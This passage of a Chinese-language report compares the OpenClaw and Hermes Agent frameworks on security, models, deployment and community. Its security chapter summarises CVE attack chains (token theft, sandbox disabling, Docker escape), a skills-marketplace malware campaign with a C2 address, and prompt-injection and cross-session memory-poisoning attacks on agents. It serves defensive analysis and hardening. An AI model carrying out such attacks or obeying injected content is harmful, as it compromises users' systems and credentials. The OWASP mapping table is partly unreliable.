OpenClaw 的 ClawHub 是一个开放的公共市场，带来了巨大的生态多样性，但也引入了严重的供应链安全风险。Hermes Agent 目前没有公共技能市场，但其技能系统更"干净" —— 技能由 Agent 自主创建或用户手动添加，不存在恶意第三方注入的风险。

**未来趋势：**

随着 agentskills.io 标准的发展，两个生态系统的技能格式可能会趋同。Hermes Agent 可能会推出自己的技能市场，而 OpenClaw 可能会加强安全审查。

---

## 第六章：安全态势分析 {#6}

这是 OpenClaw 最大的薄弱环节，也是选择 Agent 框架时必须慎重考虑的因素。

### 6.1 OpenClaw 安全态势

#### 6.1.1 关键漏洞与事件

| 漏洞/事件 | 影响与详情 | 严重性 |
|-----------|-----------|--------|
| **CVE-2026-25253** (CVSS 8.8) | 一键 RCE，通过 `gatewayUrl` token 泄露。攻击链：恶意 URL → token 盗窃 → WebSocket 劫持 → 禁用沙箱 → 逃逸 Docker → 主机 RCE | **严重** |
| **CVE-2026-24763 & CVE-2026-25157** | 通过未正确消毒的 Gateway 输入字段进行命令注入 | **严重** |
| **CVE-2026-22708** | 通过 Web 浏览进行间接 Prompt 注入。未消毒的 Web 内容使互联网成为 C2 通道 | **高** |
| **明文凭证存储** | API Key、OAuth token 和记忆以明文存储在 `~/.openclaw/` 中。被 RedLine、Lumma、Vidar 等信息窃取器主动 targeting | **严重** |
| **ClawHub 供应链（ClawHavoc）** | 2,857 中 341 个技能恶意（~12%）。通过假的"先决条件"部分分发 Atomic Stealer (AMOS)。C2 IP: `91.92.242[.]30` | **严重** |
| **Moltbook 平台泄露** | Supabase RLS 禁用 + 暴露的客户端 API Key。**150 万 API token 和 35,000 封电子邮件**公开可访问。支持完整的 Agent 模拟 | **严重** |
| **API 成本失控** | 案例：30 分钟的时间检查消耗 ~$20/晚（~120k token/次）。简单提醒的预计成本：~$750/月 | **中** |
| **身份/加密骗局** | 骗子在更名后 ~10 秒内夺取 `@clawdbot` 账号。假 `$CLAWD` 代币市值达 1600 万美元。假 VS Code 扩展植入 ScreenConnect RAT | **中** |

#### 6.1.2 攻击面分析

| 攻击面 | 威胁 | 严重性 |
|--------|------|--------|
| Control UI / Gateway API | WebSocket 劫持、token 盗窃、认证绕过、命令注入 | **严重** |
| ClawHub 技能 | 供应链恶意软件、反向 Shell、凭证盗窃 | **严重** |
| Moltbook API | 完整数据库暴露、Agent 模拟 | **严重** |
| 消息/邮件/浏览器 | 间接 Prompt 注入、数据泄露 | **高** |
| 30,000+ 公开暴露实例 | 默认 `0.0.0.0` 绑定在 VPS 部署上 | **严重** |
| 凭据以明文存储 | `~/.openclaw/credentials/` 被主动 targeting | **严重** |

#### 6.1.3 12 点加固安全清单

1. **仅绑定 Gateway 到 loopback：** `gateway.bind: "loopback"`。通过 SSH/Tailscale 远程访问。永远不要公开暴露端口 `18789`。
2. **对所有渠道启用 DM 配对。** 维护最小允许列表。
3. **禁用公共入站 DM**，除非在企业用途中严格过滤。
4. **将每个技能视为可执行供应链代码。** 审查源码，固定版本。
5. **永远不要运行 `curl | bash` 或技能文档中的外部二进制文件。**
6. **对所有 SaaS 集成使用 OAuth。**
7. **分离工作空间**（个人 vs. 企业）以防止横向移动。
8. **对工具应用最小权限**（FS、Shell、浏览器）。仅在需要时启用。
9. **加密或迁移 `~/.openclaw/credentials/`** 或集成系统密钥链/秘密管理器。
10. **记录并监控** 技能安装、工具调用、出站请求。对 WebSocket/配置更改发出警报。
11. **未经 IT 批准不得进行企业部署**（防止不受监控的"影子 AI"入口点）。
12. **保持 OpenClaw 更新。** 安全补丁频繁发布。

#### 6.1.4 OWASP Top 10 for Agentic Applications 映射

Palo Alto Networks 将 OpenClaw 的漏洞映射到 OWASP Top 10 for Agentic Applications：

| OWASP 类别 | OpenClaw 对应 |
|------------|---------------|
| **LLM01: Prompt Injection** | CVE-2026-22708，ClawHub 技能中的间接注入 |
| **LLM02: Insecure Output Handling** | 命令注入 CVE-2026-24763 |
| **LLM03: Training Data Poisoning** | ClawHub 恶意技能作为"训练数据"污染 |
| **LLM04: Model Denial of Service** | API 成本失控场景 |
| **LLM05: Supply Chain Vulnerabilities** | ClawHub 供应链攻击 |
| **LLM06: Sensitive Information Disclosure** | 明文凭证存储，Moltbook 泄露 |
| **LLM07: Insecure Plugin Design** | 默认无沙箱，系统级权限 |
| **LLM08: Excessive Agency** | Agent 自主执行命令，无人工回路 |
| **LLM09: Overreliance** | 用户信任 Agent 的安全假设 |
| **LLM10: Unauthorized Code Execution** | CVE-2026-25253 一键 RCE |

#### 6.1.5 根本安全挑战

OpenClaw 面临的根本安全挑战可以概括为 **"致命三位一体 + 持久记忆"**：

1. **自主性（Autonomy）：** Agent 可以自主执行操作
2. **工具访问（Tool Access）：** 拥有 Shell、文件系统、OAuth 等系统级权限
3. **互联网连接（Internet Connectivity）：** 可以访问外部资源
4. **持久记忆（Persistent Memory）：** `SOUL.md` 和 `MEMORY.md` 支持跨会话的持久上下文

这第四点使得 **时间偏移的 Prompt 注入、记忆污染和逻辑炸弹攻击** 成为可能 —— 恶意内容可以在一次会话中植入记忆，在后续会话中触发。

与传统软件不同，LLM Agent 在同一个 token 流中处理指令和数据。**没有防火墙** 来区分"Agent 读取的数据"和"Agent 遵循的指令"。

### 6.2 Hermes Agent 安全态势

#### 6.2.1 安全设计

Hermes Agent 在设计时就考虑了安全性：

| 安全措施 | 说明 |
|----------|------|
| **命令审批** | 可配置哪些命令需要用户确认 |
| **授权** | 平台级授权控制 |
| **容器隔离** | Docker/Singularity/Modal 后端提供隔离执行 |
| **路径遍历防护** | Web Dashboard 中的路径遍历防护 |
| **CORS 限制** | Web Dashboard 仅允许本地访问 |
| **通用错误消息** | 不泄露内部信息 |
| **密钥脱敏** | API Key 在 Dashboard 中脱敏显示 |
| **SessionDB 安全处理** | 正确处理关闭的会话数据库 |

#### 6.2.2 供应链安全

Hermes Agent 目前没有公共技能市场，这意味着：

- **无第三方恶意技能风险**：技能由 Agent 自主创建或用户手动添加
- **无集中分发风险**：不存在"排名第一的恶意技能"问题
- **但：** 随着社区增长，如果推出公共技能市场，将面临与 ClawHub 类似的挑战

#### 6.2.3 安全对比

| 维度 | OpenClaw | Hermes Agent | 胜出 |
|------|----------|--------------|------|
| 默认安全 | ❌（默认 0.0.0.0 绑定） | ✅（默认 localhost） | **Hermes** |
| 供应链风险 | ❌（12-20% 恶意技能） | ✅（无公共市场） | **Hermes** |
| 凭证存储 | ❌（明文） | ✅（脱敏，可配置） | **Hermes** |
| 容器隔离 | ✅ | ✅ | 平手 |
| 命令审批 | ✅ | ✅ | 平手 |
| 安全团队 | ❌（无漏洞赏金计划） | ✅（Nous Research 支持） | **Hermes** |
| CVE 数量 | 60+ | 极少 | **Hermes** |
| 安全指南 | ✅（社区驱动） | ✅（官方文档） | 平手 |
| Prompt 注入防护 | ❌ | ⚠️（有限） | **Hermes** |
| 内存中毒防护 | ❌ | ✅（3,575 字符限制） | **Hermes** |

---

## 第七章：模型支持与推理后端 {#7}

### 7.1 OpenClaw 模型支持

OpenClaw 支持多种 LLM 提供商：

| 提供商 | 说明 |
|--------|------|
| Anthropic | Claude 系列（推荐） |
| OpenAI | GPT 系列 |
| Google | Gemini 系列 |
| AWS Bedrock | AWS 托管模型 |
| 本地模型 | 通过本地端点 |
| OpenRouter | 多模型路由 |

**特点：**

- 主要推荐 Anthropic Claude 模型
- 支持多模型扫描（`moltbot models scan`）
- 支持 OpenRouter 作为多模型后端

### 7.2 Hermes Agent 模型支持

Hermes Agent 支持 **400+ 模型**，通过多种后端：

| 后端 | 说明 |
|------|------|
| **Nous Portal** | Nous Research 自有平台 |
| **OpenRouter** | 200+ 模型 |
| **NVIDIA NIM** | NVIDIA 优化模型 |
| **小米 MiMo** | 免费层 MiMo v2 Pro |
| **z.ai/GLM** | 智谱 GLM 系列 |
| **Kimi/Moonshot** | Kimi K2.5 等 |
| **MiniMax** | MiniMax M2.7 等 |
| **Hugging Face** | 开源模型 |
| **OpenAI** | GPT 系列 |
| **自定义端点** | 任何 OpenAI 兼容 API |
| **Ollama** | 本地推理 |
| **vLLM** | 高性能本地推理 |
| **llama.cpp** | GGUF 格式本地推理 |
| **Google AI Studio** | Google 原生支持 |

**本地模型推荐：**

| 模型 | 参数 | VRAM | 优势 |
|------|------|------|------|
| **Gemma4** | 7B–27B | 8–16 GB | 推理、代码生成。16GB+ RAM Mac 上流畅运行 |
| **Qwen3.6** | 32B–72B | 24–48 GB | 编码、视觉理解、Agent 工具使用。M4 Max（64GB）上运行良好 |

**云模型推荐（通过 Ollama Gateway）：**

| 模型 | 提供商 | 优势 |
|------|--------|------|
| `kimi-k2.5` | Minimax | 多模态推理 + 子 Agent |
| `glm-5.1` | 智谱 | 推理与代码生成 |
| `qwen3.5` | Qwen | 推理、编码、Agent 工具使用 + 视觉 |
| `minimax-m2.7` | Minimax | 快速高效的编码和实际生产力 |

### 7.3 模型支持对比

| 维度 | OpenClaw | Hermes Agent | 胜出 |
|------|----------|--------------|------|
| 支持提供商数量 | ~6+ | 33+ | **Hermes** |
| 支持模型数量 | ~50+ | 400+ | **Hermes** |
| 本地推理 | ✅ | ✅（Ollama/vLLM/llama.cpp） | 平手 |
| 模型切换 | ✅ | ✅（即时 `/model` 命令） | **Hermes** |
| 故障转移 | ✅ | ✅（有序列表，turn 中间自动切换） | **Hermes** |
| 中国模型支持 | 有限 | ✅（智谱、Kimi、MiniMax、z.ai） | **Hermes** |
| Prompt 缓存 | ✅ | ✅（稳定的系统 Prompt 前缀） | 平手 |
| 辅助模型 | ❌ | ✅（用于压缩、视觉、摘要） | **Hermes** |

---

## 第八章：部署与运维方案 {#8}

### 8.1 OpenClaw 部署方案

#### 8.1.1 安装

```bash
# macOS/Linux
curl -fsSL https://openclaw.ai/install.sh | bash
# Windows (PowerShell)
iwr -useb https://openclaw.ai/install.ps1 | iex

# 运行引导向导
openclaw

# 检查状态
openclaw status

# 打开控制台
openclaw dashboard
```

**前置条件：** Node.js 22+

#### 8.1.2 部署选项对比

| 部署方式 | 成本 | 设置难度 | 最适合 |
|----------|------|----------|--------|
| **本地/笔记本** | $0 | 简单 | 测试（日常使用风险高） |
| **Railway** | $5-10/月 | 一键 | 初学者，最快设置 |
| **Mac Mini** | ~$600 一次性 | 中等 | 24/7 本地，Apple 生态（2018+，8GB RAM 起） |
| **MacStadium** | $99+/月 | 中等 | 云 Mac，无需硬件维护 |
| **MoltCloud** | $20+/月 | 一键 | 托管，安全隔离 |
| **Cloudflare Workers** | $5+/月 | 中等 | Serverless，全球边缘 |
| **DigitalOcean** | $28/月 | 一键 | 开发者，快速云设置 |
| **Hetzner** | €3.49/月 | 中等 | 预算，EU/GDPR 合规 |
| **Vultr** | $5/月 | 简单 | 全球 VPS，预算 |
| **Hostinger** | $5-10/月 | 简单 | 预算，全球覆盖 |
| **Docker** | 取决于主机 | 中等 | 安全最佳实践 |
| **VM 沙箱** | 取决于主机 | 高 | 最大隔离 |

#### 8.1.3 运行成本

- **LLM API 使用：** ~$10–$150/月
- **托管：** $0–$100+/月（取决于方案）

### 8.2 Hermes Agent 部署方案

#### 8.2.1 安装

```bash
# Linux/macOS/WSL2/Termux
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash

# Windows (PowerShell) — 早期 Beta
irm https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1 | iex

# 安装后
source ~/.bashrc    # 或 source ~/.zshrc
hermes              # 开始聊天！
```

**前置条件：** 安装器自动安装 `uv`、Python 3.11、Node.js、ripgrep、ffmpeg。

**Ollama 快速启动：**

```bash
ollama launch hermes
```

#### 8.2.2 部署选项

| 后端 | 最佳场景 |
|------|----------|
| **Local** | 个人使用，最低延迟 |
| **Docker** | 隔离执行 |
| **SSH** | 远程执行，多机管理 |
| **Singularity** | HPC 环境 |
| **Modal** | 按需 serverless，空闲时接近零成本 |
| **Daytona** | 安全沙箱 |
| **Vercel Sandbox** | Web 原生沙箱 |

**推荐部署：**

- **低成本 VPS：** $5/月 Hetzner/Vultr 实例，24/7 运行
- **本地机器：** 使用 Ollama 进行 100% 本地推理
- **Serverless：** Modal/Daytona 按需执行

#### 8.2.3 运行成本

- **本地推理：** $0（硬件成本除外）
- **云 API：** 取决于模型和用量
- **Serverless：** 空闲时接近零成本

### 8.3 部署对比

| 维度 | OpenClaw | Hermes Agent | 胜出 |
|------|----------|--------------|------|
| 安装简易度 | ✅（一键安装） | ✅（一键安装） | 平手 |
| Windows 支持 | ✅（WSL2） | ✅（WSL2 + 早期 Beta 原生） | **Hermes** |
| Android 支持 | ❌ | ✅（Termux） | **Hermes** |
| Serverless 选项 | ❌ | ✅（Modal/Daytona/Vercel） | **Hermes** |
| Docker 支持 | ✅ | ✅ | 平手 |
| 托管方案 | ✅（MoltCloud, Railway 等） | ❌（社区方案） | **OpenClaw** |
| 一键部署 | ✅（DigitalOcean, Railway） | ❌ | **OpenClaw** |
| 100% 本地推理 | ⚠️（需要额外配置） | ✅（Ollama 原生集成） | **Hermes** |

---

## 第九章：社区生态与发展趋势 {#9}

### 9.1 GitHub 指标对比

| 指标 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| Stars | 356,000+ | 44,000+ |
| 贡献者 | 600+ | 快速增长中 |
| Commits | 15,000+ | 1,000+（截至 v0.8.0） |
| Forks | 50,000+ | 快速增长中 |
| 合并 PR | N/A | 1,000+（截至 v0.8.0） |
| 解决问题 | N/A | 82（截至 v0.8.0） |

### 9.2 社区项目

#### 9.2.1 OpenClaw 生态

- **ClawHub：** 13,700+ 技能的公共注册表
- **Moltbook：** AI Agent 社交网络（有安全问题历史）
- **Composio：** 凭证隔离集成
- **OpenClaw-Admin：** Vue 3 AI Agent 管理平台（692 stars）

#### 9.2.2 Hermes Agent 生态

| 项目 | 说明 | Stars |
|------|------|-------|
| **awesome-hermes-agent** | 社区策展资源列表 | N/A |
| **awesome-hermes-skills** | 85+ 内置 + 78 社区技能 | 5 |
| **awesome-hermes-usecases** | 策划的真实用例 | 31 |
| **hermes-go** | Go 语言 Agent 框架 | 25 |
| **hermes-vscode** | VS Code 编码 Agent | 14 |
| **hermes_stack** | 个人 AI Agent 设置 | 1 |
| **hermes-skills** | 310+ 可重用工作流 | 5 |
| **OpenClaw-Admin** | 同时支持 OpenClaw 和 Hermes | 692 |

### 9.3 迁移工具

Hermes Agent 提供官方的 OpenClaw 迁移工具：

```bash
hermes claw migrate
```

这使得从 OpenClaw 迁移到 Hermes Agent 变得简单。

### 9.4 发展趋势

#### 9.4.1 OpenClaw 趋势

- 创始人加入 OpenAI 后，项目由独立基金会维护
- ClawHub 生态持续快速增长，但安全问题亟待解决
- 企业功能预计在 2026-2027 年推出
- 安全审查机制可能在未来引入

#### 9.4.2 Hermes Agent 趋势

- 快速增长，大量开发者从 OpenClaw 迁移
- 与 MiniMax AI 的战略合作（M2.7 模型针对 Hermes 优化）
- 自进化生态系统（DSPy + GEPA）持续成熟
- Web UI Dashboard 在 v0.13.0 中引入
- 社区技能生态系统快速增长

---

## 第十章：选型指南与未来展望 {#10}

### 10.1 选型决策矩阵

| 场景 | 推荐 | 原因 |
|------|------|------|
| **个人 24/7 助手，注重隐私** | Hermes Agent | 本地推理 + 自进化 + 四层记忆 |
| **快速原型，多平台覆盖** | OpenClaw | 更成熟的平台集成 |
| **企业部署，安全优先** | Hermes Agent | 更好的安全设计 + 无供应链风险 |
| **团队协，多用户** | OpenClaw | 更成熟的会话隔离和权限管理 |
| **编码助手，技能复用** | Hermes Agent | 自动技能创建 + 技能自我改进 |
| **低成本运行** | Hermes Agent | Serverless 选项 + 动态技能加载降低 token 成本 |
| **中国模型支持** | Hermes Agent | 原生支持智谱、Kimi、MiniMax 等 |
| **Managed Service** | OpenClaw | MoltCloud、Railway 一键部署 |
| **研究/实验** | Hermes Agent | DSPy/GEPA 集成 + 轨迹生成 |
| **最大生态** | OpenClaw | 13,700+ 技能，更大的社区 |

### 10.2 未来展望

#### 10.2.1 AI Agent 安全

2026 年初的 OpenClaw 安全危机是 AI Agent 领域的一个分水岭。它揭示了一个根本性问题：**当 Agent 拥有系统级访问权限时，供应链安全不再是可选项，而是必选项。**

预计 2026 年下半年：

- 公共技能市场将引入更严格的安全审查
- 代码签名和沙箱将成为默认要求
- 行业安全标准将逐步形成

#### 10.2.2 自进化 Agent

Hermes Agent 的学习循环代表了 AI Agent 的未来方向。随着 DSPy、GEPA 等优化框架的成熟，Agent 将能够：

- 自动优化自身的 Prompt 和工作流
- 从用户反馈中学习并适应
- 在多个 Agent 之间共享学习成果

#### 10.2.3 模型agnostic 趋势

两个框架都支持多种模型提供商，这反映了行业的整体趋势：**不依赖单一模型提供商**。随着模型竞争加剧，用户将能够从最佳模型中获益，而不被锁定在某个生态系统中。

#### 10.2.4 本地推理

随着硬件能力提升和模型压缩技术进步，本地推理将变得更加可行。Hermes Agent 对 Ollama 的原生支持使其在这一趋势中处于有利位置。

### 10.3 总结

| 维度 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| **核心理念** | Agent 运行时环境 | 自进化 AI 代理 |
| **最强优势** | 生态规模、平台覆盖、托管选项 | 学习循环、记忆系统、安全设计 |
| **最大弱点** | 安全态势、供应链风险 | 生态规模较小、托管选项有限 |
| **适合人群** | 想要快速启动、多平台集成的用户 | 注重隐私、长期学习、安全优先的用户 |
| **一句话评价** | "能做很多事，但需要小心使用" | "越用越聪明，但需要耐心培育" |

**最终建议：**

- 如果你需要一个**快速部署、多平台覆盖、有托管选项**的 Agent，OpenClaw 是更好的选择，但务必遵循安全加固指南。
- 如果你看重**长期学习、隐私保护、安全设计、本地推理**，Hermes Agent 是更好的选择，尤其是其自进化能力将在长期使用中带来显著回报。

两个框架都在快速发展，选择不应被视为永久性的。Hermes Agent 的迁移工具使得在两者之间切换变得容易，你可以根据需求变化随时调整。

---

## 附录 A：关键术语表 {#appendix-a}

| 术语 | 解释 |
|------|------|
| **Agent** | 能够自主规划和执行任务的 AI 系统 |
| **Gateway** | Agent 框架的中央守护进程，管理连接和路由 |
| **Skill** | 可重用的能力包，教导 Agent 如何执行特定任务 |
| **SKILL.md** | 技能定义文件的标准格式 |
| **MCP** | Model Context Protocol，模型上下文协议 |
| **ClawHub** | OpenClaw 的公共技能注册表 |
| **Learning Loop** | 观察→规划→执行→学习的闭环反馈 |
| **Prompt Injection** | 通过注入恶意指令来操纵 Agent 行为 |
| **Supply Chain Attack** | 通过第三方依赖传播的恶意攻击 |
| **FTS5** | SQLite 全文搜索引擎 |
| **DSPy** | 声明式语言模型编程框架 |
| **GEPA** | 基于进化的 Prompt 优化算法 |
| **Token** | LLM 处理的基本单位（约等于 0.75 个英文单词） |
| **Context Window** | LLM 一次能处理的 token 数量上限 |
| **RCE** | Remote Code Execution，远程代码执行 |
| **CVSS** | Common Vulnerability Scoring System，通用漏洞评分系统 |

## 附录 B：参考资料列表 {#appendix-b}

### OpenClaw 相关资料

1. Valletta Software. "OpenClaw Architecture & Setup Guide (2026)". https://vallettasoftware.com/blog/post/openclaw-2026-guide
2. BuildMVPFast. "OpenClaw Guide 2026: The Complete AI Agent Handbook". https://www.buildmvpfast.com/openclaw-guide-2026
3. RobotPaper. "Reference Architecture: OpenClaw (Early Feb 2026 Edition, Opus 4.6)". https://robotpaper.ai/reference-architecture-openclaw-early-feb-2026-edition-opus-4-6/
4. Adversa AI. "OpenClaw security 101: Vulnerabilities & hardening (2026)". https://adversa.ai/blog/openclaw-security-101-vulnerabilities-hardening-2026/
5. Snyk. "ToxicSkills Research: AI Agent Skills Supply Chain Audit". https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
6. Koi Security. "Researchers Find 341 Malicious ClawHub Skills". https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html
7. ProArch. "OpenClaw One-Click RCE Vulnerability (CVE-2026-25253)". https://www.proarch.com/blog/threats-vulnerabilities/openclaw-rce-vulnerability-cve-2026-25253
8. Silverfort. "ClawHub vulnerability enables attackers to manipulate rankings". https://www.silverfort.com/blog/clawhub-vulnerability-enables-attackers-to-manipulate-rankings-to-become-the-number-one-skill/
9. Medium. "355k GitHub Stars in 5 Months: The Complete Honest Guide to OpenClaw". https://medium.com/data-science-collective/355k-github-stars-in-5-months-17-defense-rate-the-complete-honest-guide-to-openclaw-28d2f59598e1
10. Context Studios. "The Complete OpenClaw Guide: How We Run an AI Agent in Production 2026". https://www.contextstudios.ai/blog/the-complete-openclaw-guide-how-we-run-an-ai-agent-in-production-2026

### Hermes Agent 相关资料

1. Nous Research. "Hermes Agent Documentation". https://hermes-agent.nousresearch.com/docs/
2. Nous Research. "Hermes Agent GitHub Repository". https://github.com/nousresearch/hermes-agent
3. Bitcoin.com News. "What Is Hermes Agent? Nous Research's Self-Improving AI Explained". https://news.bitcoin.com/what-is-hermes-agent-nous-researchs-self-improving-ai-explained/
4. AI.cc. "Hermes Agent 2026: Self-Improving Open-Source AI Agent vs OpenClaw Guide". https://www.ai.cc/blogs/hermes-agent-2026-self-improving-open-source-ai-agent-vs-openclaw-guide/
5. Pooya Golchian. "Hermes Agent with Ollama 2026: Self-Improving Local AI Agent Setup and Benchmarks". https://pooya.blog/blog/hermes-agent-ollama-local-ai-agent-2026/
6. Mr. Anand. "Inside Hermes Agent: How a Self-Improving AI Agent Actually Works". https://mranand.substack.com/p/inside-hermes-agent-how-a-self-improving
7. YUV.AI. "Hermes Agent: Self-Improving AI with Persistent Memory". https://yuv.ai/blog/hermes-agent
8. LinkedIn. "Hermes Agent by Nous Research: The Self-Improving Open-Source Framework". https://www.linkedin.com/pulse/hermes-agent-nous-research-self-improving-open-source-developers-gly1c

### ClawHub 技能资料

1. ClawHub. "Deep Researcher". https://clawhub.ai/h4gen/deep-researcher
2. ClawHub. "AI Researcher". https://clawhub.ai/1kalin/ai-researcher
3. ClawHub. "Unifuncs Deep Research". https://clawhub.ai/vinlic/unifuncs-deep-research
4. ClawHub. "Academic Deep Research". https://clawhub.ai/kesslerio/academic-deep-research
5. ClawHub. "Web Researcher". https://clawhub.ai/aokikaito79/web-researcher
6. LobeHub. "ClawHub Skills Marketplace". https://lobehub.com/skills/openclaw-skills-clawhubb

### 行业分析

1. FlowZap. "Understanding the Self-Improvement Loops of the Various AI Agent Frameworks Today". https://flowzap.xyz/blog/understanding-the-self-improvement-loops-of-the-various-ai-agent-frameworks
2. Medium. "The Agent Landscape in 2026: A Compass Through the Noise". https://medium.com/data-science-collective/the-agent-landscape-in-2026-a-compass-through-the-noise-7c638e4aebe1
3. TWIML AI. "AI Trends 2026: OpenClaw Agents, Reasoning LLMs, and More". https://twimlai.com/podcast/twimlai/ai-trends-2026-openclaw-agents-reasoning-llms

---

*报告完成。本报告基于 2026 年 5 月前的公开信息编写。由于两个项目都在快速迭代，建议读者参考官方文档获取最新动态。*
